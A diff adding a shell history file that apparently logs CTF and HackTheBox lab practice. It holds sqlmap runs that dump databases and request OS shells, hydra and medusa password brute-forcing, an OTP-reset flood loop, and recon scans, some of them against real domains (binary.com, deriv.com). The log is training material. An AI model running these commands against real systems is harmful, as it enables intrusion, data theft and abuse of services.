+ 1028  clear
+ 1029  sqlmap -u https://9caf87260e3d326f26596c0ba3a7bf8b.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10 --batch
+ 1030  clear
+ 1031  sqlmap -u https://51dd700e66c94ea8e5b6ff18208ceca0.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10 --batch
+ 1032  sqlmap -u https://edc4d0e1674f57a8564be63b6c80078e.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10 --batch
+ 1033  clear
+ 1034  sqlmap -u https://edc4d0e1674f57a8564be63b6c80078e.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 --dump-all -v 6 --tamper=space2comment --os-shell --time-sec 10 --batch
+ 1035  for i in {1..1000}; do curl -X 'POST' 'http://94.237.48.22:45581/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email": "htbpentester7@hackthebox.com"}'; done
+ 1036  echo 
+ 1037  echo "SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo=" | base64 -d
+ 1038  sudo vim a.sh
+ 1039  chmod +x a.sh
+ 1040  sudo chmod +x a.sh
+ 1041  ./a.sh
+ 1042  sudo vim a.sh
+ 1043  ./a.sh
+ 1044  clear
+ 1045  clearclear
+ 1046  clear
+ 1047  vim a.sh
+ 1048  sudo vim a.sh
+ 1049  ./a.sh
+ 1050  clear
+ 1051  sudo vim a.sh
+ 1052  ./a.sh
+ 1053  sudo vim a.sh
+ 1054  ./a.sh
+ 1055  sudo vim a.sh
+ 1056  code vim a.sh
+ 1057  mkdir supabase
+ 1058  cd supabase
+ 1059  mkdir deriv
+ 1060  ls
+ 1061  rmdir deriv
+ 1062  ls
+ 1063  cd ..
+ 1064  mkdir deriv
+ 1065  ls
+ 1066  cd deriv
+ 1067  ls
+ 1068  cat *
+ 1069  sudo vim hosts.txt
+ 1070  sudo ../../loganbek/htb/tools/./lb_nmap.sh 0 hosts.txt
+ 1071  ls
+ 1072  sudo vim sub-hosts.txt
+ 1073  gobuster --help
+ 1074  ls
+ 1075  gobuster --help
+ 1076  while IFS= read -r url; do     domain="${url#*.}";     gobuster dns -d "$domain" -w sub-hosts.txt -t 50 -o "sub_fuzz_${domain}.txt" -r; done < sub-hosts.txt
+ 1077  gobuster --help
+ 1078  while IFS= read -r url; do     domain="${url#*.}";     gobuster dns -d "$domain" -w sub-hosts.txt -t 50 -o "sub_fuzz_${domain}.txt"; done < sub-hosts.txt
+ 1079  while IFS= read -r url; do     domain="${url#*.}";     gobuster vhost -u "http://$domain" -w sub-hosts.txt -t 50 -o "vhost_fuzz_${domain}.txt"; done < sub-hosts.txt
+ 1080  ls
+ 1081  ls sub*
+ 1082  cat sub *
+ 1083  clear
+ 1084  ls sub*
+ 1085  ls sub_*
+ 1086  cat sub_*
+ 1087  rm sub_*
+ 1088  ls
+ 1089  while IFS= read -r domain; do     gobuster dns -d "$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o "sub_fuzz_${domain}.txt"; done < sub-hosts.txt
+ 1090  ls 
+ 1091  rm sub_*
+ 1092  ls
+ 1093  sed 's/^\*\.//g' sub-hosts.txt > cleaned_sub_hosts.txt
+ 1094  ls
+ 1095  cat cleaned_sub_hosts.txt 
+ 1096  while IFS= read -r domain; do     gobuster dns -d "$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o "sub_fuzz_${domain}.txt"; done < cleaned_sub_hosts.txt
+ 1097  lks
+ 1098  ls
+ 1099  code ~/htb/tools
+ 1100  ~/htb/tools/./lb_nmap.sh 0 *.txt
+ 1101  code *
+ 1102  ls
+ 1103  cat sub*
+ 1104  ls
+ 1105  cat sub_fuzz_.txt
+ 1106  clear
+ 1107  cat sub_hosts
+ 1108  cat sub_hosts.txt 
+ 1109  cat cleaned_sub_hosts.txt 
+ 1110  sudo vim cleaned_sub_hosts.txt 
+ 1111  cat sub_fuzz_binary.com.txt
+ 1112  ls
+ 1113  rm sub_fuzz_.txt
+ 1114  ls
+ 1115  cat sub_fuzz_*.txt | sed 's/^Found: //g' | awk NF | uniq
+ 1116  cat sub*
+ 1117  clear
+ 1118  cat *
+ 1119  clear
+ 1120  ls
+ 1121  cat sub_fuzz_binary.com.txt 
+ 1122  ls
+ 1123  cat sub_fuzz_*.txt | sed 's/^Found: //g' | awk NF | uniq
+ 1124  for file in sub_fuzz_*.txt; do     sed 's/^Found: //g' "$file" | tr -s '\n' | tee "$file" > /dev/null; done
+ 1125  ls
+ 1126  cat sub_fuzz_binary.com.txt 
+ 1127  for file in sub_fuzz_*.txt; do     sed 's/^Found: //g' "$file" | tr -s '\n' > temp && mv temp "$file"; done
+ 1128  cat sub_fuzz_binary.com.txt 
+ 1129  sed 's/^.*Found: //g' /mnt/data/sub_fuzz_binary.com.txt | tr -s '\n' > /mnt/data/temp.txt && mv /mnt/data/temp.txt /mnt/data/sub_fuzz_binary.com.txt
+ 1130  ls -lah
+ 1131  history | grep lb_nmap
+ 1132  sudo ../htb/tools./lb_nmap.sh 2 *.txt
+ 1133  sudo ../htb/tools/./lb_nmap.sh 2 *.txt
+ 1134  ls
+ 1135  history
+ 1136  while IFS= read -r domain; do     gobuster dns -d "$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o "sub_fuzz_${domain}.txt"; done < cleaned_sub_hosts.txt
+ 1137  while IFS= read -r domain; do     gobuster vhost -u "http://$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o "vhost_fuzz_${domain}.txt"; done < cleaned_sub_hosts.txt
+ 1138  cd deriv
+ 1139  ls
+ 1140  clear
+ 1141  while IFS= read -r domain; do     gobuster vhost -u "http://$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o "vhost_fuzz_${domain}.txt"; done < cleaned_sub_hosts.txt
+ 1142  ls
+ 1143  rm vhost*
+ 1144  history
+ 1145  ls
+ 1146  cp hosts.txt cleaned-hosts.txt
+ 1147  sudo vim cleaned-hosts.txt 
+ 1148  ls
+ 1149  rm quick*
+ 1150  ls
+ 1151  rm quick_scan_smarttrader.deriv.com.xml 
+ 1152  ls
+ 1153  cat sub_fuzz_binary.com.txt 
+ 1154  clear
+ 1155  ls
+ 1156  clear
+ 1157  while IFS= read -r domain; do     gobuster vhost -u "http://$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o "vhost_fuzz_${domain}.txt" --append-domain; done < sub-hosts.txt
+ 1158  clear
+ 1159  while IFS= read -r domain; do     gobuster vhost -u "http://$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o "vhost_fuzz_${domain}.txt" --append-domain; done < cleaned_sub-hosts.txt
+ 1160  clear
+ 1161  while IFS= read -r domain; do     gobuster vhost -u "http://$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o "vhost_fuzz_${domain}.txt" --append-domain; done < cleaned_sub_hosts.txt
+ 1162  clear
+ 1163  ls
+ 1164  rm vhost*
+ 1165  ls
+ 1166  rm quick*
+ 1167  ls
+ 1168  mv cleaned-hosts.txt cleaned_hosts.txt
+ 1169  ls
+ 1170  mv sub-hosts.txt sub_hosts.txt
+ 1171  ls
+ 1172  cat sub*
+ 1173  sudo vim assembler.sh
+ 1174  sudo chmod +x assembler.sh 
+ 1175  sudo vim flag.s
+ 1176  ./assembler.sh flag.s
+ 1177  sudo vim flag-optimized.s
+ 1178  ./assembler.sh flag-optimized.s 
+ 1179  unzip flag.zip
+ 1180  cat flag.s
+ 1181  sudo vim flag2.s
+ 1182  ls
+ 1183  code flag*.s
+ 1184  unzip loaded_shellcode.zip
+ 1185  ls loaded_shellcode*
+ 1186  sudo vim loaded_shellcode2.s
+ 1187  ./assembler loaded_shellcode2.s 
+ 1188  ./assembler.sh loaded_shellcode2.s 
+ 1189  objdump -M intel --no-show-raw-insn --no-addresses -d loaded_shellcode
+ 1190  ls
+ 1191  ls load*
+ 1192  code loaded_shellcode.s loaded_shellcode2.s
+ 1193  ./assembler.sh loaded_shellcode.s 
+ 1194  sudo vim shellcoder.py
+ 1195  chmod +x shellcoder.py
+ 1196  sudo chmod +x shellcoder.py
+ 1197  code flag-optimized.s
+ 1198  history | grep flag-optimized
+ 1199  ./assembler.sh flag-optomized.s
+ 1200  ./assembler.sh flag-optimized.s
+ 1201  gh repo clone dsneddon00/HTB-Assembly
+ 1202  cd HTB-Assembly/
+ 1203  ls
+ 1204  msfconsole -q
+ 1205  ls
+ 1206  cat h101ctf_fuzz.md
+ 1207  ls
+ 1208  cd htb
+ 1209  cd tools
+ 1210  ls
+ 1211  code htb-code-scrape.js 
+ 1212  cd ..
+ 1213  ls
+ 1214  cd ..
+ 1215  ls
+ 1216  git status
+ 1217  cd htb
+ 1218  ls
+ 1219  git status
+ 1220  git commit -a
+ 1221  git add *
+ 1222  git status
+ 1223  git commit -m "API attacks + Web Fuzz"
+ 1224  git push
+ 1225  git status
+ 1226  clear
+ 1227  exit
+ 1228  history
+ 1229  sqlmap -u https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/ --data 'username=admin&password=test' --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
+ 1230  sqlmap -u https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
+ 1231  sqlmap -u https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/?page=admin.auth.inc --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
+ 1232  sqlmap -u https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/?page=admin.auth.inc --random-agent --level 5 --risk 3 -v 6 --os-shell --threads 10 --no-cast
+ 1233  clear
+ 1234  sqlmap -u https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/?page=admin.auth.inc --random-agent --level 5 --risk 3 -v 6 --os-shell --threads 10 --no-cast
+ 1235  sqlmap -u https://82adce98af5d290ccdb072e898cce600.ctf.hacker101.com/?page=admin.auth.inc --random-agent --level 5 --risk 3 -v 6 --os-shell --threads 10 --no-cast
+ 1236  history
+ 1237  sqlmap --help | grep forms
+ 1238  cat ~/htb/notes/* | grep '--forms'
+ 1239  cat ~/htb/notes/* | grep 'forms'
+ 1240  hydra -l admin -P /usr/share/wordlists/rockyou.txt 1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com https-post-form "/?page=admin.auth.inc:username=^USER^&password=^PASS^:Incorrect username or password"
+ 1241  ls
+ 1242  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt https://82adce98af5d290ccdb072e898cce600.ctf.hacker101.com/?page=admin.auth.inc https-post-form "/?page=admin.auth.inc:username=^USER^&password=^PASS^:Incorrect username or password"
+ 1243  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt 82adce98af5d290ccdb072e898cce600.ctf.hacker101.com/?page=admin.auth.inc https-post-form "/?page=admin.auth.inc:username=^USER^&password=^PASS^:Incorrect username or password"
+ 1244  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt 82adce98af5d290ccdb072e898cce600.ctf.hacker101.com https-post-form "/?page=admin.auth.inc:username=^USER^&password=^PASS^:Incorrect username or password"
+ 1245  nikto
+ 1246  nikto -h https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/?page=admin.auth.inc
+ 1247  nikto -h https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/?page=admin.auth.inc -C all
+ 1248  nikto https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/?page=admin.auth.inc
+ 1249  nikto -h https://1578f9ea6092a475ce5c02adce2b56a2.ctf.hacker101.com/?page=admin.auth.inc
+ 1250  nmap -sV -O -p- https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/
+ 1251  sudo nmap -sV -O -p- https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/
+ 1252  sudo nmap -sV -O -p- 30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/
+ 1253  sudo nmap -sV -sC -O -p- 30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com
+ 1254  history
+ 1255  sqlmap -u https://82adce98af5d290ccdb072e898cce600.ctf.hacker101.com/?page=admin.auth.inc --random-agent --level 5 --risk 3 -v 6 --os-shell --threads 10 --no-cast
+ 1256  sqlmap -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/ --random-agent --level 5 --risk 3 -v 6 --os-shell --threads 10 --no-cast
+ 1257  gobuster dns -d https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
+ 1258  gobuster dns -d 30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
+ 1259  clear
+ 1260  gobuster dir -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ 1261  medusa -h https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com -u grinch -P /usr/share/wordlists/rockyout.txt -M http -m FORM:/secure-login -T 10
+ 1262  medusa -h https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com -u grinch -P /usr/share/wordlists/rockyou.txt -M http -m FORM:/secure-login -T 10
+ 1263  medusa -h 30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com -u grinch -P /usr/share/wordlists/rockyou.txt -M http -m FORM:/secure-login -T 10
+ 1264  medusa
+ 1265  history
+ 1266  gobuster dir -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/signup-manager/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ 1267  wafw00f
+ 1268  wafw00f https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com
+ 1269  wafw00f https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/
+ 1270  history
+ 1271  sqlmap -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/ --random-agent --level 5 --risk 3 -v 6 --os-shell --threads 10 --no-cast
+ 1272  sqlmap -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/forum/login/ --random-agent --level 5 --risk 3 -v 6 --os-shell --threads 10 --no-cast
+ 1273  ls
+ 1274  cat ~/htb/notes/* | grep w00f
+ 1275  cat ~/htb/notes/* | grep wafw00f
+ 1276  history
+ 1277  clear
+ 1278  nikto -h https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/
+ 1279  sqlmap -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/evil-quiz/admin/ --random-agent --level 5 --risk 3 -v 6 --os-shell --threads 10 --no-cast
+ 1280  cat README.md 
+ 1281  transmission-gtk
+ 1282  sudo apt install transmission
+ 1283  transmission-gtk
+ 1284  sqlmap -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/secure-login/ --data 'username=admin&password=test' --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
+ 1285  sqlmap -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/hate-mail-generator/new/ --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
+ 1286  sqlmap -u https://7673990d73cc0dbd42fb60dcce459197.ctf.hacker101.com/register --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
+ 1287  history
+ 1288  sqlmap -u https://30f789b7c25c87d769ae6b2df75691a6.ctf.hacker101.com/secure-login/ --data 'username=admin&password=test' --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
+ 1289  sqlmap -u https://7673990d73cc0dbd42fb60dcce459197.ctf.hacker101.com/login --data 'username=admin&password=test' --random-agent --level 5 --risk 3 -v 6 --os-shell --time-sec 10 --threads 10 --no-cast
+ 1290  nikto -h https://7673990d73cc0dbd42fb60dcce459197.ctf.hacker101.com -C all
+ 1291  history
+ 1292  history | grep ffuf
+ 1293  ffuf -u https://9ffafb29e55d2c3632939cdc20e6b6dc.ctf.hacker101.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -ic -v -o h101ctf_fuzz -of all
+ 1294  ffuf -u https://7673990d73cc0dbd42fb60dcce459197.ctf.hacker101.com/s3cr3t-4dm1n/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -ic -v
+ 1295  ffuf -u https://7673990d73cc0dbd42fb60dcce459197.ctf.hacker101.com/s3cr3t-4dm1n/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -recursion -ic -v
+ 1296  cat htb/notes/* | grep proxychains
+ 1297  nmap --help | grep '-T'
+ 1298  nmap --help | grep '\-T'
+ 1299  nmap --help | grep 'T'
+ 1300  clear
+ 1301  cat live_hosts.txt
+ 1302  clear
+ 1303  sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://83.136.252.63:44741/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
+ 1304  sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://83.136.252.63:44741/level1/level2 FUZZ -e .html -recursion -recursion-depth 2 -rate 500
+ 1305  sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://83.136.252.63:44741/level1/level2/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
+ 1306  sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -ic -u http://83.136.252.63:44741/level1/level2/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
+ 1307  sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -ic -u http://83.136.252.63:44474/level1/level2/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
+ 1308  cd htb
+ 1309  git status
+ 1310  history > notes/history/history1.txt
